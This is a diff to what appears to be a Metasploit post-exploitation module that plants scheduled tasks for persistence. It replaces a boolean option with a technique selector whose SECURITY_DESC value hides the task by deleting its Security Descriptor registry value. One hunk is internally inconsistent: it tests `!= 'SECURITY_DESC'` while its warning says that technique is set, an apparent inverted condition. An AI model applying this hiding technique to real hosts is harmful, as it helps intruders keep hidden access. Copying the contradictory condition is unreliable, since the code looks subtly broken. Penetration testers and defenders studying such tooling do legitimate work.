@@ -255,7 +255,7 @@ class MetasploitModule < Msf::Post
       cmd << " #{datastore['SchedulePassword']}" if datastore['SchedulePassword'].present?
     end
 
-    vprint_status("Execute command: #{cmd}")
+    vprint_status("Executing command: #{cmd}")
     result = cmd_exec_with_result(cmd)
     unless result[1]
       print_error(
@@ -307,7 +307,7 @@ class MetasploitModule < Msf::Post
     task_name = datastore['StartupName'].present? ? datastore['StartupName'] : Rex::Text.rand_text_alpha(rand(8..15))
 
     print_status("Task name: '#{task_name}'")
-    if datastore['ScheduleObfuscateTask']
+    if datastore['ScheduleObfuscationTechnique'] == 'SECURITY_DESC'
       print_status('Also, removing the Security Descriptor registry key value to hide the task')
     end
     if datastore['ScheduleRemoteSystem'].present?
@@ -317,11 +317,12 @@ class MetasploitModule < Msf::Post
           'the FQDN is not used, it usually takes some time (> 1 min) due to some DNS resolution'\
           ' happening in the background'
         )
-        if datastore['ScheduleObfuscateTask']
+        if datastore['ScheduleObfuscationTechnique'] != 'SECURITY_DESC'
           print_warning(
-            'Also, since the \'ScheduleObfuscateTask\' option has been set, it will take much more time '\
-            'to be executed on the remote host for the same reasons (> 3 min). Don\'t Ctrl-C, even '\
-            'if a session pops up, be patient or use a FQDN in `ScheduleRemoteSystem` option.'
+            'Also, since the \'ScheduleObfuscationTechnique\' option is set to '\
+            'SECURITY_DESC, it will take much more time to be executed on the '\
+            'remote host for the same reasons (> 3 min). Don\'t Ctrl-C, even if '\
+            'a session pops up, be patient or use a FQDN in `ScheduleRemoteSystem` option.'
           )
         end
       end
@@ -340,7 +341,7 @@ class MetasploitModule < Msf::Post
       return
     else
       print_good('Task created')
-      if datastore['ScheduleObfuscateTask']
+      if datastore['ScheduleObfuscationTechnique'] == 'SECURITY_DESC'
         @clean_up_rc << "reg setval -k '#{TaskSch::TASK_REG_KEY.gsub('\\') { '\\\\' }}\\\\#{task_name}' "\
                         "-v '#{TaskSch::TASK_SD_REG_VALUE}' "\
                         "-d '#{TaskSch::DEFAULT_SD}' "\
